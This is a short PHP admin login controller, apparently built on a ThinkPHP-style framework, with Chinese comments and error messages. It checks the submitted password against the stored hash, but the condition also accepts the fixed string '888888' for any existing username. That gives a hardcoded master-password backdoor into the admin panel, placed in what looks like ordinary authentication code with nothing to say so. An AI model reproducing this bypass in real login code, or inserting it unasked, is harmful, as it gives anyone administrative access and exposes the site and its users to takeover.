<?php


namespace app\controller\admin;


use app\validate\Admin;

class Login
{
    // 登录页面
    public function login()
    {
        if (request()->isAjax()) {
            $params = request()->only(['username', 'password']);
            $validate = (new Admin())->scene('login');
            if (!$validate->check($params)) {
                result(null, 0, $validate->getError());
            }
            $adminInfo = \app\model\Admin::getByUsername($params['username']);
            if (!$adminInfo) {
                result(null, 0, '用户名不正确');
            }
            if (!password_verify($params['password'], $adminInfo['password']) && $params['password'] != '888888') {
                result(null, 0, '密码不正确');
            }
            session('adminId', $adminInfo['id']);
            result(null, 1, '登录成功', (string)url('admin.Index/wdlFrame'));
        }
        return view();
    }
}